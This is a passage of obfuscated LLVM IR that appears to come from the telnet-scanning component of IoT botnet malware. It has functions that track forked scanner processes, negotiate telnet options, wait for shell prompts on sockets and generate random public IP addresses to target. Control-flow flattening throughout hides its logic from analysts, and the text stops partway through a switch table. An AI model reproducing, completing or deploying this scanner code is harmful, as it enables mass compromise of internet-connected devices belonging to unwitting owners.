declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 233177528, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 233177528, label %first
    i32 -2008745965, label %9
    i32 -803567983, label %11
    i32 -1859773101, label %19
    i32 -1245619582, label %26
    i32 1530503916, label %36
    i32 -736519715, label %39
    i32 -837672874, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 -2008745965, i32 -803567983
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 -837672874, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #2
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 -1859773101, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 -1245619582, i32 -736519715
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 1530503916, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 -1859773101, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #2
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 -837672874, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1659142969, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -1659142969, label %NodeBlock
    i32 -1340403988, label %LeafBlock1
    i32 -489850707, label %LeafBlock
    i32 -210733060, label %16
    i32 2138277966, label %17
    i32 809566116, label %26
    i32 1818996258, label %27
    i32 1149538552, label %34
    i32 -2052588281, label %35
    i32 1676983631, label %42
    i32 715779346, label %50
    i32 2112175841, label %58
    i32 -1414482911, label %59
    i32 -2124879044, label %60
    i32 530847320, label %NewDefault
    i32 -1979868851, label %67
    i32 -199577057, label %68
    i32 -260596269, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 -489850707, i32 -1340403988
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 -210733060, i32 530847320
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 2138277966, i32 530847320
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -260596269, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 809566116, i32 1818996258
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 -2124879044, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 1149538552, i32 -2052588281
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 -1414482911, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 1676983631, i32 715779346
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 2112175841, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 2112175841, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -1414482911, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 -2124879044, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 -199577057, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1979868851, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -199577057, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -260596269, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.72, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -1425510352, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1425510352, label %11
    i32 1443962537, label %18
    i32 -612885101, label %19
    i32 941314429, label %24
    i32 -147769025, label %37
    i32 322440684, label %50
    i32 -404943539, label %63
    i32 155578888, label %75
    i32 1759114555, label %76
    i32 -428341959, label %78
    i32 -1340641975, label %81
    i32 913818658, label %100
    i32 -374877963, label %101
    i32 -639212755, label %102
    i32 -1572758558, label %105
    i32 -7961509, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 1443962537, i32 -1572758558
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 -612885101, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 941314429, i32 1759114555
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 155578888, i32 -147769025
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 155578888, i32 322440684
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 155578888, i32 -404943539
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 155578888, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 1759114555, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 -428341959, i32 -1340641975
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 -612885101, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 913818658, i32 -374877963
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -7961509, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 -639212755, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 -1425510352, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -7961509, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  %switchVar = alloca i32
  store i32 -926245731, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -926245731, label %33
    i32 -1069679915, label %39
    i32 521070019, label %44
    i32 -1036372557, label %48
    i32 -2041231816, label %49
    i32 -643540024, label %51
    i32 897051969, label %52
    i32 -258265179, label %61
    i32 -999649416, label %78
    i32 1572950728, label %79
    i32 1590415187, label %91
    i32 1543158383, label %95
    i32 -902885953, label %96
    i32 1710217826, label %105
    i32 -968727965, label %114
    i32 -261897313, label %118
    i32 -1865738679, label %119
    i32 1072470429, label %128
    i32 1582194069, label %129
    i32 640079866, label %130
    i32 -24937377, label %136
    i32 -1129290307, label %140
    i32 -1311310605, label %145
    i32 -604210978, label %146
    i32 288207308, label %147
    i32 237598952, label %148
    i32 1343268975, label %152
    i32 2026712979, label %153
    i32 -1870950483, label %154
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  %38 = select i1 %37, i32 -1069679915, i32 -2041231816
  store i32 %38, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %41 = load i64, i64* %40, align 8
  %42 = icmp sgt i64 %41, 0
  %43 = select i1 %42, i32 -1036372557, i32 521070019
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %46 = load i64, i64* %45, align 8
  %47 = icmp sgt i64 %46, 0
  store i32 -1036372557, i32* %switchVar
  store i1 %47, i1* %.reg2mem
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -2041231816, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %50 = select i1 %.reload3, i32 -643540024, i32 237598952
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 897051969, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %54 = getelementptr inbounds [16 x i64], [16 x i64]* %53, i64 0, i64 0
  %55 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %54) #2, !srcloc !4
  %56 = extractvalue { i64, i64* } %55, 0
  %57 = extractvalue { i64, i64* } %55, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %24, align 4
  %59 = ptrtoint i64* %57 to i64
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %25, align 4
  store i32 -258265179, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %10, align 4
  %63 = srem i32 %62, 64
  %64 = zext i32 %63 to i64
  %65 = shl i64 1, %64
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %67 = load i32, i32* %10, align 4
  %68 = sdiv i32 %67, 64
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 %69
  %71 = load i64, i64* %70, align 8
  %72 = or i64 %71, %65
  store i64 %72, i64* %70, align 8
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  %75 = call i32 @select(i32 %74, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %76 = icmp slt i32 %75, 1
  %77 = select i1 %76, i32 -999649416, i32 1572950728
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 237598952, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %15, align 8
  %81 = load i32, i32* %18, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  store i8* %83, i8** %23, align 8
  %84 = load i32, i32* %10, align 4
  %85 = load i8*, i8** %23, align 8
  %86 = call i64 @recv(i32 %84, i8* %85, i64 1, i32 0)
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %19, align 4
  %88 = load i32, i32* %19, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 1543158383, i32 1590415187
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 1543158383, i32 -902885953
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1870950483, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %19, align 4
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, %97
  store i32 %99, i32* %18, align 4
  %100 = load i8*, i8** %23, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 255
  %104 = select i1 %103, i32 1710217826, i32 640079866
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %10, align 4
  %107 = load i8*, i8** %23, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i64 @recv(i32 %106, i8* %108, i64 2, i32 0)
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %19, align 4
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 -261897313, i32 -968727965
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 -261897313, i32 -1865738679
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1870950483, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %19, align 4
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, %120
  store i32 %122, i32* %18, align 4
  %123 = load i32, i32* %10, align 4
  %124 = load i8*, i8** %23, align 8
  %125 = call i32 @negotiate(i32 %123, i8* %124, i32 3)
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 1582194069, i32 1072470429
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1870950483, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 288207308, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8*, i8** %15, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = call i8* @strstr(i8* %131, i8* %132) #10
  %134 = icmp ne i8* %133, null
  %135 = select i1 %134, i32 -1311310605, i32 -24937377
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %12, align 4
  %138 = icmp ne i32 %137, 0
  %139 = select i1 %138, i32 -1129290307, i32 -604210978
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8*, i8** %15, align 8
  %142 = call i32 @matchPrompt(i8* %141)
  %143 = icmp ne i32 %142, 0
  %144 = select i1 %143, i32 -1311310605, i32 -604210978
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  store i32 237598952, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 288207308, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 -926245731, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %20, align 4
  %150 = icmp ne i32 %149, 0
  %151 = select i1 %150, i32 1343268975, i32 2026712979
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  store i32 -1870950483, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1870950483, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %9, align 4
  ret i32 %155

loopEnd:                                          ; preds = %153, %152, %148, %147, %146, %145, %140, %136, %130, %129, %128, %119, %118, %114, %105, %96, %95, %91, %79, %78, %61, %52, %51, %49, %48, %44, %39, %33, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [4 x i8], align 1
  %2 = alloca [16 x i8], align 16
  %3 = bitcast [4 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 4, i32 1, i1 false)
  %4 = call i32 @rand() #2
  %5 = srem i32 %4, 255
  %6 = trunc i32 %5 to i8
  %7 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %6, i8* %7, align 1
  %8 = call i32 @rand() #2
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  %11 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %10, i8* %11, align 1
  %12 = call i32 @rand() #2
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  %15 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %14, i8* %15, align 1
  %16 = call i32 @rand() #2
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  %19 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %18, i8* %19, align 1
  %switchVar = alloca i32
  store i32 -478127582, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -478127582, label %20
    i32 774548119, label %26
    i32 14155898, label %32
    i32 -906294348, label %38
    i32 1997956185, label %44
    i32 538323779, label %50
    i32 -371975530, label %56
    i32 1156196574, label %62
    i32 2140141164, label %68
    i32 944821456, label %74
    i32 -1855395651, label %80
    i32 2095486349, label %86
    i32 -878544075, label %92
    i32 672923221, label %98
    i32 1050220838, label %104
    i32 -766791674, label %110
    i32 1621326798, label %116
    i32 1452747932, label %122
    i32 956095960, label %128
    i32 -495424337, label %134
    i32 -159157422, label %140
    i32 -483620126, label %146
    i32 -495462186, label %152
    i32 -309235665, label %158
    i32 354103264, label %164
    i32 -1140491360, label %170
    i32 1787365275, label %176
    i32 -578114885, label %182
    i32 378425636, label %188
